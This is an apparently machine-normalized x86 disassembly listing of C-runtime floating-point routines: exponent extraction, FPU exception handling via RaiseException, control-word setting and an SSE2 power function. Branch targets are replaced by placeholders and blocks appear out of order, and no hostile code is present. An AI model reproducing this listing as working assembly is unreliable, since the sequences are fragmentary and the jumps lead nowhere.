fldz
fucompp
fnstsw ax
test ah 0x44
jpo r-xdata
inc edi
fld [ r--data ]
fld [ r--data ]
jmp r-xdata
mov ecx [ ebp + 0xc ]
fldz
fcomp [ ecx ]
fnstsw ax
test ah 0x5
jpe r-xdata
cmp eax 0x800
je r-xdata
xor edi edi
inc edi
fld [ ecx ]
lea eax [ ebp - 0x4 ]
push eax
push ecx
push ecx
fstp [ esp ]
call sub_42372c
mov eax [ ebp - 0x4 ]
add esp 0xc
add eax 0xfffffa00
mov [ ebp - 0x4 ] eax
fst [ ebp - 0x10 ]
fldz
cmp eax 0xfffffbce
jge r-xdata
fstp [ ecx ]
fld [ r--data ]
jmp r-xdata
mov ecx [ ebp + 0xc ]
fldz
fcomp [ ecx ]
fnstsw ax
test ah 0x5
jpo r-xdata
cmp eax ecx
jne r-xdata
and esi 0xfffffffd
push 0x10
call sub_423942
pop ecx
fcompp
xor edx edx
fnstsw ax
test ah 0x41
jne r-xdata
xor edi edi
fmulp st1
inc edi
jmp r-xdata
fld [ r--data ]
jmp r-xdata
and esi 0xfffffffe
jmp r-xdata
mov ecx [ ebp + 0xc ]
fldz
fcomp [ ecx ]
fnstsw ax
fld [ r--data ]
test ah 0x5
jpo r-xdata
mov eax [ ebp - 0xa ]
mov ecx 0xfffffc03
and eax 0xf
or eax 0x10
mov [ ebp - 0xa ] ax
mov eax [ ebp - 0x4 ]
cmp eax ecx
jge r-xdata
inc edx
mov eax [ ebp + 0xc ]
fstp [ eax ]
jmp r-xdata
fchs
jmp r-xdata
fld [ ebp - 0x10 ]
test edx edx
je r-xdata
sub ecx eax
mov eax [ ebp - 0x10 ]
test edi edi
pop edi
je r-xdata
fchs
shr eax 0x1
test [ ebp - 0xc ] 0x1
mov [ ebp - 0x10 ] eax
je r-xdata
test edi edi
jne r-xdata
shr [ ebp - 0xc ] 0x1
sub ecx 0x1
jne r-xdata
or eax 0x80000000
mov [ ebp - 0x10 ] eax
inc edi
test [ ebp - 0x10 ] 0x1
je r-xdata
sub_423347
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_42336a
add esp 0x1c
pop ebp
retn
sub_42336a
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor ecx ecx
push ebx
xor ebx ebx
inc ebx
mov [ eax + 0x4 ] ecx
mov eax [ ebp + 0x8 ]
push edi
mov edi 0xc000000d
mov [ eax + 0x8 ] ecx
mov eax [ ebp + 0x8 ]
mov [ eax + 0xc ] ecx
mov ecx [ ebp + 0x10 ]
test cl 0x10
je r-xdata
test cl 0x2
je r-xdata
mov eax [ ebp + 0x8 ]
mov edi 0xc000008f
or [ eax + 0x4 ] ebx
test cl 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov edi 0xc0000093
or [ eax + 0x4 ] 0x2
test cl 0x4
je r-xdata
mov eax [ ebp + 0x8 ]
mov edi 0xc0000091
or [ eax + 0x4 ] 0x4
test cl 0x8
je r-xdata
mov eax [ ebp + 0x8 ]
mov edi 0xc000008e
or [ eax + 0x4 ] 0x8
mov ecx [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0xc ]
mov eax [ esi ]
shl eax 0x4
not eax
xor eax [ ecx + 0x8 ]
and eax 0x10
xor [ ecx + 0x8 ] eax
mov ecx [ ebp + 0x8 ]
mov eax [ esi ]
add eax eax
not eax
xor eax [ ecx + 0x8 ]
and eax 0x8
xor [ ecx + 0x8 ] eax
mov ecx [ ebp + 0x8 ]
mov eax [ esi ]
shr eax 0x1
not eax
xor eax [ ecx + 0x8 ]
and eax 0x4
xor [ ecx + 0x8 ] eax
mov ecx [ ebp + 0x8 ]
mov eax [ esi ]
shr eax 0x3
not eax
xor eax [ ecx + 0x8 ]
and eax 0x2
xor [ ecx + 0x8 ] eax
mov eax [ esi ]
mov ecx [ ebp + 0x8 ]
shr eax 0x5
not eax
xor eax [ ecx + 0x8 ]
and eax ebx
xor [ ecx + 0x8 ] eax
call sub_42399d
mov edx eax
test dl 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov edi 0xc0000090
or [ eax + 0x4 ] 0x10
test dl 0x4
je r-xdata
mov ecx [ ebp + 0x8 ]
or [ ecx + 0xc ] 0x10
test dl 0x8
je r-xdata
mov eax [ ebp + 0x8 ]
or [ eax + 0xc ] 0x8
test dl 0x10
je r-xdata
mov eax [ ebp + 0x8 ]
or [ eax + 0xc ] 0x4
test dl 0x20
je r-xdata
mov eax [ ebp + 0x8 ]
or [ eax + 0xc ] 0x2
mov eax [ esi ]
mov ecx 0xc00
and eax ecx
je r-xdata
mov eax [ ebp + 0x8 ]
or [ eax + 0xc ] ebx
mov eax [ ebp + 0x8 ]
and [ eax ] 0xfffffffc
cmp eax 0x400
je r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
and eax 0xffffffeb
or eax 0x8
cmp eax 0x200
je r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
and eax 0xfffffffd
or eax ebx
jmp r-xdata
cmp eax 0x800
je r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x20 ]
and eax 0xffffffe3
or eax 0x2
mov [ ecx + 0x20 ] eax
mov eax [ ebp + 0x18 ]
fld [ eax ]
mov eax [ ebp + 0x8 ]
fstp [ eax + 0x10 ]
mov eax [ ebp + 0x8 ]
or [ eax + 0x60 ] ebx
mov ecx [ ebp + 0x8 ]
mov ebx [ ebp + 0x1c ]
mov eax [ ecx + 0x60 ]
and eax 0xffffffe3
or eax 0x2
mov [ ecx + 0x60 ] eax
mov eax [ ebp + 0x8 ]
fld [ ebx ]
fstp [ eax + 0x50 ]
mov eax [ ebp + 0x8 ]
and [ eax + 0x20 ] 0xffffffe1
mov eax [ ebp + 0x18 ]
fld [ eax ]
mov eax [ ebp + 0x8 ]
fstp [ eax + 0x10 ]
mov eax [ ebp + 0x8 ]
or [ eax + 0x60 ] ebx
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0x1c ]
and [ eax + 0x60 ] 0xffffffe1
mov eax [ ebp + 0x8 ]
fld [ ebx ]
fstp [ eax + 0x50 ]
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
and eax 0xffffffe7
or eax 0x4
jmp r-xdata
cmp eax ecx
jne r-xdata
mov [ ecx ] eax
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
and eax 0xfffffffe
or eax 0x2
cmp eax ecx
jne r-xdata
test [ ecx + 0x8 ] 0x8
je r-xdata
and [ esi ] 0xfffffffe
call sub_423903
lea eax [ ebp + 0x8 ]
push eax
push 0x1
push 0x0
push edi
call [ RaiseException@IAT ]
mov ecx [ ebp + 0x8 ]
test [ ecx + 0x8 ] 0x10
je r-xdata
mov [ ecx ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x14 ]
shl ecx 0x5
xor ecx [ eax ]
and ecx 0x1ffe0
xor [ eax ] ecx
mov eax [ ebp + 0x8 ]
or [ eax + 0x20 ] ebx
cmp [ ebp + 0x20 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
and [ eax ] 0xffffffe3
jmp r-xdata
mov eax [ esi ]
mov ecx 0x300
and eax ecx
je r-xdata
mov eax [ ebp + 0x8 ]
or [ eax ] 0x3
jmp r-xdata
test [ ecx + 0x8 ] 0x4
je r-xdata
and [ esi ] 0xfffffffb
test [ ecx + 0x8 ] 0x2
je r-xdata
and [ esi ] 0xfffffff7
test [ ecx + 0x8 ] 0x1
je r-xdata
and [ esi ] 0xffffffef
mov eax [ ecx ]
mov edx 0xfffff3ff
and eax 0x3
sub eax 0x0
je r-xdata
and [ esi ] 0xffffffdf
and [ esi ] edx
sub eax 0x1
je r-xdata
mov eax [ esi ]
and eax edx
or eax 0x300
sub eax 0x1
je r-xdata
mov eax [ esi ]
and eax 0xfffff7ff
or eax 0x400
jmp r-xdata
sub eax 0x1
je r-xdata
fld [ ecx + 0x50 ]
fstp [ ebx ]
fld [ ecx + 0x50 ]
fstp [ ebx ]
jmp r-xdata
mov eax [ esi ]
and eax edx
or eax 0x200
jmp r-xdata
sub eax 0x1
jne r-xdata
mov [ esi ] eax
jmp r-xdata
mov eax [ esi ]
and eax 0xfffffbff
or eax 0x800
sub eax 0x1
jne r-xdata
pop edi
pop ebx
pop ebp
retn
mov [ esi ] eax
cmp [ ebp + 0x20 ] 0x0
pop esi
je r-xdata
and [ esi ] edx
jmp r-xdata
mov eax [ ecx ]
shr eax 0x2
and eax 0x7
sub eax 0x0
je r-xdata
or [ esi ] 0xc00
jmp r-xdata
sub_42365b
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0x1
je r-xdata
call sub_41529e
mov [ eax ] 0x21
add eax 0xfffffffe
cmp eax 0x1
ja r-xdata
pop ebp
retn
call sub_41529e
mov [ eax ] 0x22
pop ebp
retn
sub_42368a
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
sub esp 0x20
xor ecx ecx
mov eax ecx
mov ecx [ eax * 8 + r--data ]
inc eax
cmp eax 0x1d
jl r-xdata
push 0xffff
push [ ebp + 0x28 ]
call sub_423916
push [ ebp + 0x8 ]
call sub_42365b
fld [ ebp + 0x20 ]
add esp 0xc
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x1c ]
push esi
mov esi [ ebp + 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x20 ]
push 0xffff
push [ ebp + 0x28 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x24 ]
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x4 ] eax
call sub_423916
lea eax [ ebp - 0x20 ]
push eax
call sub_417cd9
add esp 0xc
test eax eax
jne r-xdata
cmp [ eax * 8 + r--data ] edx
je r-xdata
jmp r-xdata
fld [ ebp - 0x8 ]
pop esi
jmp r-xdata
push esi
call sub_42365b
pop ecx
mov [ ebp - 0x1c ] ecx
test ecx ecx
je r-xdata
mov esp ebp
pop ebp
retn
sub_42372c
mov edi edi
push ebp
mov ebp esp
fld [ ebp + 0x8 ]
fldz
fucom st1
fnstsw ax
push edi
test ah 0x44
jpe r-xdata
push esi
mov si [ ebp + 0xe ]
movzx eax si
test eax 0x7ff0
jne r-xdata
fstp st1
xor edi edi
jmp r-xdata
push 0x0
push ecx
fstp st0
push ecx
fstp [ esp ]
call sub_423800
movzx edi si
add esp 0xc
shr edi 0x4
and edi 0x7ff
sub edi 0x3fe
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
test ecx 0xfffff
jne r-xdata
mov eax [ ebp + 0x10 ]
mov [ eax ] edi
pop edi
pop ebp
retn
fcompp
mov edi 0xfffffc03
fnstsw ax
test ah 0x41
jne r-xdata
test edx edx
je r-xdata
xor eax eax
xor eax eax
inc eax
jmp r-xdata
mov ecx 0xffef
and si cx
mov [ ebp + 0xe ] si
test eax eax
je r-xdata
add ecx ecx
mov [ ebp + 0xc ] ecx
test edx edx
jns r-xdata
test [ ebp + 0xe ] 0x10
jne r-xdata
fld [ ebp + 0x8 ]
push 0x0
push ecx
push ecx
fstp [ esp ]
call sub_423800
add esp 0xc
jmp r-xdata
mov eax 0x8000
or si ax
mov [ ebp + 0xe ] si
add edx edx
dec edi
test [ ebp + 0xe ] 0x10
je r-xdata
or ecx 0x1
mov [ ebp + 0xc ] ecx
pop esi
mov si [ ebp + 0xe ]
mov [ ebp + 0x8 ] edx
sub_423800
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov ecx [ ebp + 0x10 ]
movzx eax [ ebp + 0xe ]
fld [ ebp + 0x8 ]
and eax 0x800f
fstp [ ebp - 0x8 ]
lea ecx [ ecx + 0x3fe ]
shl ecx 0x4
or ecx eax
mov [ ebp - 0x2 ] cx
fld [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_42382f
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x7ff00000
mov eax [ ebp + 0x8 ]
jne r-xdata
cmp [ ebp + 0xc ] 0xfff00000
jne r-xdata
test eax eax
jne r-xdata
mov cx [ ebp + 0xe ]
mov edx 0x7ff8
and cx dx
cmp cx dx
jne r-xdata
test eax eax
jne r-xdata
inc eax
pop ebp
retn
mov edx 0x7ff0
cmp cx dx
jne r-xdata
push 0x3
jmp r-xdata
push 0x2
xor eax eax
pop ebp
retn
test [ ebp + 0xc ] 0x7ffff
jne r-xdata
pop eax
pop ebp
retn
push 0x4
jmp r-xdata
test eax eax
je r-xdata
sub_42388d
push 0x8
push r--data
call sub_40e2a0
cmp [ rw-data ] 0x1
jl r-xdata
call sub_40e2e6
retn
mov eax [ ebp + 0x8 ]
test al 0x40
je r-xdata
and eax 0xffffffbf
mov [ ebp + 0x8 ] eax
ldmxcsr [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
ldmxcsr [ ebp + 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
jmp r-xdata
sub_423916
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
fwait
fnstcw [ ebp - 0x4 ]
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
not ecx
and cx [ ebp - 0x4 ]
and eax [ ebp + 0xc ]
or cx ax
mov [ ebp - 0x8 ] cx
fldcw [ ebp - 0x8 ]
movsx eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_423942
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
sub esp 0xc
test cl 0x1
je r-xdata
test cl 0x8
je r-xdata
fld [ r--data ]
fistp [ ebp - 0x4 ]
fwait
test cl 0x10
je r-xdata
fwait
fnstsw ax
fld [ r--data ]
fstp [ ebp - 0xc ]
fwait
fwait
fnstsw ax
test cl 0x4
je r-xdata
fld [ r--data ]
fstp [ ebp - 0xc ]
fwait
test cl 0x20
je r-xdata
fldz
fld1
fdivrp st1
fstp st0
fwait
mov esp ebp
pop ebp
retn
fldpi
fstp [ ebp - 0xc ]
fwait
sub_4239af
mov edi edi
push ebp
mov ebp esp
mov cx [ ebp + 0xe ]
mov edx 0x7ff0
mov ax cx
and ax dx
cmp ax dx
jne r-xdata
movzx ecx cx
and ecx 0x8000
test ax ax
jne r-xdata
fld [ ebp + 0x8 ]
push ecx
push ecx
fstp [ esp ]
call sub_42382f
pop ecx
pop ecx
sub eax 0x1
je r-xdata
fld [ ebp + 0x8 ]
fldz
fucompp
fnstsw ax
test ah 0x44
jpe r-xdata
test [ ebp + 0xc ] 0xfffff
jne r-xdata
mov eax 0x200
pop ebp
retn
sub eax 0x1
je r-xdata
neg ecx
sbb ecx ecx
and ecx 0xffffff08
lea eax [ ecx + 0x100 ]
pop ebp
retn
neg ecx
sbb ecx ecx
and ecx 0xffffffe0
lea eax [ ecx + 0x40 ]
pop ebp
retn
neg ecx
sbb ecx ecx
and ecx 0xffffff90
lea eax [ ecx + 0x80 ]
pop ebp
retn
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x4
sub eax 0x1
je r-xdata
push 0x2
jmp r-xdata
xor eax eax
inc eax
pop ebp
retn
pop eax
pop ebp
retn
sub_423a89
movlpd xmm0 [ esp + 0x4 ]
movlpd xmm7 [ r--data ]
movlpd xmm2 [ r--data ]
andpd xmm7 xmm0
movsd xmm4 xmm0
psrlq xmm0 0x2c
pextrw eax xmm0 0x0
orpd xmm7 xmm2
pextrw ecx xmm4 0x3
and eax 0xff
add eax 0x1
and eax 0x1fe
mulsd xmm7 [ eax * 4 + r--data ]
movlpd xmm5 [ eax * 4 + r--data ]
add eax eax
movapd xmm6 [ eax * 4 + r--data ]
mov edx 0x7fef
sub edx ecx
sub ecx 0x10
or ecx edx
cmp ecx 0x80000000
jae r-xdata
movlpd xmm1 [ esp + 0xc ]
movlpd xmm3 [ r--data ]
movd eax xmm1
movsd xmm2 xmm1
andpd xmm1 xmm3
psrlq xmm1 0x20
movd ecx xmm1
cmp ecx 0x7ff00000
jae r-xdata
mov ecx 0x0
mov edx 0x3fe7f
movlpd xmm7 [ esp + 0x4 ]
movlpd xmm4 [ esp + 0x4 ]
movd edx xmm7
psrlq xmm7 0x20
movd eax xmm7
mov ecx eax
and eax 0x7fffffff
cmp eax 0x7ff00000
jb r-xdata
or eax ecx
cmp eax 0x0
je r-xdata
movlpd xmm4 [ esp + 0x4 ]
movlpd xmm2 [ esp + 0xc ]
movd eax xmm4
cmp eax 0x0
jne r-xdata
and edx 0x7ff0
sub eax 0x3ff0
add eax edx
mov edx 0x40a0
sub edx eax
sub eax 0x3c70
or edx eax
cmp edx 0x80000000
jae r-xdata
movlpd xmm3 [ r--data ]
xorpd xmm1 xmm1
andpd xmm3 xmm2
pcmpeqd xmm1 xmm3
pmovmskb eax xmm1
and eax 0xff
cmp eax 0xff
jne r-xdata
ja r-xdata
movd eax xmm4
psrlq xmm4 0x20
movd edx xmm4
and edx 0x7fffffff
mov ecx eax
or eax edx
movlpd xmm0 [ r--data ]
mov edx 0x1a
cmp eax 0x0
je r-xdata
cmp edx 0x0
jge r-xdata
psrlq xmm4 0x20
movd edx xmm4
cmp edx 0x3ff00000
je r-xdata
pshufd xmm4 xmm1 0x44
mulpd xmm4 xmm6
pextrw eax xmm4 0x3
and eax 0x7ff0
mov edx 0x40a0
sub edx eax
sub eax 0x3c70
or edx eax
cmp edx 0x80000000
jb r-xdata
subsd xmm4 xmm6
subsd xmm2 xmm4
movlpd xmm4 [ r--data ]
andpd xmm3 xmm1
andpd xmm4 xmm6
subsd xmm0 xmm2
xorpd xmm2 xmm2
mov edx 0x4060
pinsrw xmm2 edx 0x3
movsd xmm5 xmm3
mulsd xmm3 xmm4
subsd xmm6 xmm4
subsd xmm1 xmm5
mulsd xmm3 xmm2
mulsd xmm5 xmm6
movapd xmm2 [ r--data ]
mulsd xmm4 xmm1
cvtsd2si eax xmm3
mulsd xmm6 xmm1
movapd xmm1 [ r--data ]
addsd xmm5 xmm4
pshufd xmm4 xmm6 0xee
addsd xmm5 xmm6
mov edx 0x1ff7f
sub edx eax
add eax 0x1e1ff
or edx eax
sub eax 0x1e1ff
cmp edx 0x0
jle r-xdata
addsd xmm2 xmm2
movsd xmm0 xmm2
mov edx 0x3ee
jmp r-xdata
pextrw eax xmm2 0x3
movlpd xmm4 [ esp + 0x4 ]
and eax 0x8000
xor ecx 0xbff00000
or edx ecx
cmp edx 0x0
je r-xdata
addsd xmm4 xmm4
movsd xmm0 xmm4
mov edx 0x3ee
jmp r-xdata
cmp edx 0x0
ja r-xdata
sub esp 0x1c
movlpd [ esp + 0x10 ] xmm0
mov [ esp + 0xc ] edx
mov edx esp
add edx 0x10
mov [ esp + 0x8 ] edx
add edx 0x18
mov [ esp + 0x4 ] edx
sub edx 0x8
mov [ esp ] edx
call sub_42890f
fld [ esp + 0x10 ]
add esp 0x1c
retn
movd eax xmm4
mov edx 0x1d
and eax 0x7fffffff
cmp eax 0x7ff00000
ja r-xdata
mov ecx 0x0
neg edx
add edx 0x7fef
psllq xmm3 0x34
orpd xmm2 xmm3
mov ecx 0x3f3
movd xmm3 ecx
psrlq xmm1 0x14
psubd xmm1 xmm3
pxor xmm3 xmm3
pmaxsw xmm1 xmm3
psllq xmm2 xmm1
pcmpeqd xmm2 xmm3
pmovmskb eax xmm2
mov ecx edx
and edx 0x7fff
cmp edx 0x7ff0
jae r-xdata
fld1
retn
cmp edx 0xbff00000
jne r-xdata
cmp eax 0x80000000
jb r-xdata
cmp eax 0x0
jle r-xdata
add ecx eax
and eax 0x7f
and ecx 0xffffff80
add ecx 0x1ff80
addsd xmm4 xmm0
movsd xmm0 xmm3
addsd xmm3 [ r--data ]
mulpd xmm2 xmm7
subsd xmm3 [ r--data ]
mulpd xmm7 xmm7
subsd xmm0 xmm3
add eax eax
add eax eax
add eax eax
add eax eax
movapd xmm3 [ eax + r--data ]
movapd xmm6 [ r--data ]
mulpd xmm1 xmm7
addpd xmm2 xmm1
pshufd xmm1 xmm2 0xee
mulsd xmm2 xmm7
xorpd xmm7 xmm7
mov edx 0x3f80
addsd xmm2 xmm1
pinsrw xmm7 edx 0x3
addsd xmm2 xmm4
movlpd xmm4 [ r--data ]
movd xmm1 ecx
mulsd xmm2 [ esp + 0xc ]
mulsd xmm0 xmm7
psllq xmm1 0x2d
pshufd xmm1 xmm1 0x44
movapd xmm7 [ r--data ]
addsd xmm5 xmm2
mulpd xmm3 xmm1
addsd xmm0 xmm5
unpcklpd xmm0 xmm0
mulpd xmm6 xmm0
mulsd xmm4 xmm0
mulpd xmm0 xmm0
addpd xmm7 xmm6
mulpd xmm7 xmm0
mulsd xmm0 xmm3
pshufd xmm6 xmm7 0xee
mulsd xmm0 xmm7
pshufd xmm5 xmm3 0xee
mulsd xmm6 xmm3
mulsd xmm4 xmm3
addsd xmm0 xmm5
sub esp 0x10
addsd xmm0 xmm6
addsd xmm0 xmm4
addsd xmm0 xmm3
movlpd [ esp + 0x4 ] xmm0
fld [ esp + 0x4 ]
add esp 0x10
retn
cmp eax 0x0
je r-xdata
jmp r-xdata
jb r-xdata
mov edx eax
and edx 0x7fffffff
cmp edx 0x0
jne r-xdata
andpd xmm7 xmm0
movsd xmm4 xmm0
andpd xmm0 [ r--data ]
psrlq xmm0 0x2c
pextrw eax xmm0 0x0
orpd xmm7 xmm2
and eax 0xff
add eax 0x1
and eax 0x1fe
mulsd xmm7 [ eax * 4 + r--data ]
movlpd xmm5 [ eax * 4 + r--data ]
add eax eax
movapd xmm6 [ eax * 4 + r--data ]
mov edx 0x43e7f
jmp r-xdata
movlpd xmm3 [ r--data ]
xorpd xmm1 xmm1
andpd xmm3 xmm4
pcmpeqd xmm1 xmm3
pmovmskb ecx xmm1
and ecx 0xff
cmp ecx 0xff
jne r-xdata
and eax 0xff
cmp eax 0xff
jne r-xdata
fld1
retn
movlpd xmm4 [ esp + 0x4 ]
pextrw edx xmm4 0x3
and edx 0x7ff0
sub edx 0x3ff0
pextrw eax xmm1 0x3
xor eax edx
and eax 0x8000
cmp eax 0x0
jne r-xdata
or ecx 0x1ff80
movd xmm0 ecx
psllq xmm0 0x2d
sub esp 0x10
movlpd [ esp + 0x4 ] xmm0
fld [ esp + 0x4 ]
add esp 0x10
retn
cmp eax 0xfffc0200
jle r-xdata
cmp eax 0x40000
jae r-xdata
pextrw eax xmm4 0x3
and eax 0x7ff0
cmp eax 0x3ff0
jae r-xdata
pextrw eax xmm4 0x3
and eax 0x7ff0
cmp eax 0x3ff0
jb r-xdata
sub esp 0x10
movlpd [ esp + 0x4 ] xmm0
fld [ esp + 0x4 ]
add esp 0x10
retn
cmp ecx 0x0
ja r-xdata
mov edx [ esp + 0x10 ]
and edx 0x80000000
cmp edx 0x0
je r-xdata
movd xmm1 edx
psubq xmm0 xmm1
psrlq xmm0 0x8
cvtdq2pd xmm0 xmm0
movlpd xmm1 [ r--data ]
movsd xmm3 xmm7
psrlq xmm7 0x26
pextrw eax xmm7 0x0
andpd xmm4 [ r--data ]
and eax 0xff
add eax 0x1
and eax 0x1fe
mulsd xmm3 [ eax * 4 + r--data ]
mulsd xmm5 [ eax * 4 + r--data ]
add eax eax
addpd xmm6 [ eax * 4 + r--data ]
orpd xmm4 [ r--data ]
addsd xmm6 xmm0
andpd xmm1 xmm4
movsd xmm2 xmm3
psrlq xmm3 0x1f
pextrw eax xmm3 0x0
movlpd xmm0 [ r--data ]
subsd xmm4 xmm1
movlpd xmm7 [ r--data ]
and eax 0x1ff
add eax 0x1
and eax 0x3fe
mulsd xmm5 [ eax * 4 + r--data ]
mulsd xmm2 [ eax * 4 + r--data ]
addpd xmm6 [ eax * 8 + r--data ]
andpd xmm0 xmm5
subsd xmm5 xmm0
addsd xmm7 xmm2
movsd xmm3 xmm0
mulsd xmm0 xmm1
mulsd xmm1 xmm5
mulsd xmm3 xmm4
subsd xmm2 xmm0
mulsd xmm4 xmm5
movsd xmm0 xmm6
subsd xmm2 xmm1
addsd xmm6 xmm7
movlpd xmm1 [ esp + 0xc ]
pextrw eax xmm1 0x3
subsd xmm2 xmm3
subsd xmm0 xmm6
movlpd xmm3 [ r--data ]
pextrw edx xmm6 0x3
subsd xmm2 xmm4
movsd xmm4 xmm6
addsd xmm0 xmm7
subsd xmm7 xmm2
subsd xmm6 xmm2
unpcklpd xmm7 xmm7
and eax 0x7ff0
cmp eax 0x7ff0
jae r-xdata
pextrw ecx xmm4 0x3
and ecx 0x8000
cmp ecx 0x0
je r-xdata
movlpd xmm2 [ esp + 0x4 ]
movd eax xmm2
psrlq xmm2 0x20
movd edx xmm2
and edx 0x7fffffff
or eax edx
mov ecx 0x0
cmp eax 0x0
je r-xdata
movlpd xmm1 [ esp + 0xc ]
movlpd xmm2 [ esp + 0xc ]
mov ecx 0x3f4
movd xmm3 ecx
andpd xmm1 [ r--data ]
psrlq xmm1 0x34
psubd xmm1 xmm3
movlpd xmm3 [ r--data ]
psllq xmm2 xmm1
pcmpeqd xmm2 xmm3
pmovmskb eax xmm2
and eax 0xff
mov ecx 0x3ff01
add ecx eax
and ecx 0x40000
cmp edx 0x10
jb r-xdata
movlpd xmm0 [ r--data ]
movd xmm1 ecx
mulsd xmm0 xmm0
psllq xmm1 0x2d
orpd xmm0 xmm1
mov edx 0x19
jmp r-xdata
jmp r-xdata
push esi
mov edx eax
and eax 0x7f
add ecx 0x80
and edx 0xffffff80
add edx 0x3fe80
push edi
mov edi 0x0
mov edx 0x18
cmp ecx 0x0
je r-xdata
push esi
mov edx eax
and eax 0x7f
add ecx 0x3ff00
sub edx 0x80
and edx 0xffffff80
push edi
mov edi 0x3ff0
jmp r-xdata
fld [ r--data ]
retn
fldz
retn
fldz
retn
shl ecx 0xd
and eax ecx
cmp eax 0x0
jne r-xdata
shl ecx 0xd
and eax ecx
mov edx 0x7ff00000
or edx eax
movd xmm0 edx
psllq xmm0 0x20
movlpd xmm1 [ r--data ]
movlpd xmm2 [ esp + 0x4 ]
divsd xmm1 xmm2
mov edx 0x1b
jmp r-xdata
movlpd xmm1 [ esp + 0xc ]
pextrw eax xmm1 0x3
and eax 0x8000
cmp eax 0x0
je r-xdata
and eax 0xff
cmp eax 0xff
jne r-xdata
movlpd xmm1 [ r--data ]
movlpd xmm0 [ r--data ]
mulsd xmm1 xmm1
mov edx 0x1c
jmp r-xdata
xorpd xmm0 xmm0
mov eax 0x43f0
pinsrw xmm0 eax 0x3
movlpd xmm7 [ r--data ]
movlpd xmm2 [ r--data ]
mulsd xmm0 xmm4
movd edx xmm4
psrlq xmm4 0x20
movd eax xmm4
cmp edx 0x0
je r-xdata
mov edx 0xbfe7f
movlpd xmm3 [ r--data ]
movlpd xmm2 [ r--data ]
jmp r-xdata
pop esi
addsd xmm0 xmm1
mulsd xmm0 xmm7
mulsd xmm6 xmm0
addsd xmm0 xmm6
pextrw eax xmm0 0x3
and eax 0x7ff0
mov edx 0x18
cmp eax 0x7ff0
je r-xdata
pop esi
mulsd xmm0 xmm7
mulsd xmm1 xmm7
addsd xmm0 xmm1
mulsd xmm6 xmm0
addsd xmm0 xmm6
pextrw eax xmm0 0x3
and eax 0x7ff0
mov edx 0x18
cmp eax 0x7ff0
je r-xdata
movlpd xmm0 [ r--data ]
mulsd xmm0 xmm0
jmp r-xdata
movlpd xmm0 [ r--data ]
mulsd xmm0 [ r--data ]
jmp r-xdata
addsd xmm4 xmm0
movsd xmm0 xmm3
addsd xmm3 [ r--data ]
mov esi edx
sub esi 0x1ff80
mulpd xmm2 xmm7
subsd xmm3 [ r--data ]
mulpd xmm7 xmm7
subsd xmm0 xmm3
add eax eax
add eax eax
add eax eax
add eax eax
movapd xmm3 [ eax + r--data ]
movapd xmm6 [ r--data ]
mulpd xmm1 xmm7
addpd xmm2 xmm1
pshufd xmm1 xmm2 0xee
mulsd xmm2 xmm7
addsd xmm2 xmm1
addsd xmm2 xmm4
movlpd xmm4 [ r--data ]
movd xmm1 edx
sub edx 0x1ff80
neg edx
sar edx 0x7
add edx 0x2
mov eax edx
and eax 0x20
add edx eax
xorpd xmm7 xmm7
mov eax 0x3f80
pinsrw xmm7 eax 0x3
mulsd xmm2 [ esp + 0x14 ]
mulsd xmm0 xmm7
psllq xmm1 0x2d
pshufd xmm1 xmm1 0x44
movapd xmm7 [ r--data ]
addsd xmm5 xmm2
mulpd xmm3 xmm1
addsd xmm0 xmm5
unpcklpd xmm0 xmm0
mulpd xmm6 xmm0
mulsd xmm4 xmm0
mulpd xmm0 xmm0
addpd xmm7 xmm6
mulpd xmm7 xmm0
mulsd xmm0 xmm3
pshufd xmm6 xmm7 0xee
mulsd xmm0 xmm7
pshufd xmm5 xmm3 0xee
mulsd xmm6 xmm3
mulsd xmm4 xmm3
movd xmm7 ecx
psllq xmm7 0x2d
movd xmm2 edx
pcmpeqd xmm1 xmm1
psllq xmm1 xmm2
addsd xmm0 xmm5
addsd xmm0 xmm6
andpd xmm1 xmm3
addsd xmm0 xmm4
xorpd xmm6 xmm6
pcmpeqd xmm4 xmm4
psllq xmm4 xmm2
subsd xmm3 xmm1
movsd xmm2 xmm1
addsd xmm1 xmm0
andpd xmm1 xmm4
pinsrw xmm6 edi 0x3
pop edi
subsd xmm2 xmm1
addsd xmm0 xmm2
addsd xmm0 xmm3
cmp esi 0x0
jg r-xdata
fld [ r--data ]
retn
fldz
retn
fldz
retn
